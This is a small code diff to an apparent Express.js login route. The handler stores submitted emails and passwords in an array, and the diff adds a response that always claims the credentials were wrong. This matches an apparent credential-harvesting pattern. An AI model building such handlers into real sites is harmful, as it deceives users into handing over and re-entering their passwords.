@@ -30,7 +30,7 @@ app.post('/', async function (req, res) {
   try {
     const { email, password } = req.body;
     data.push(email, password);
-   
+   res.end("Check your EMAIL AND PASSWORD AND TRY AGAIN")
 
   } catch (error) {
     res.send(error)
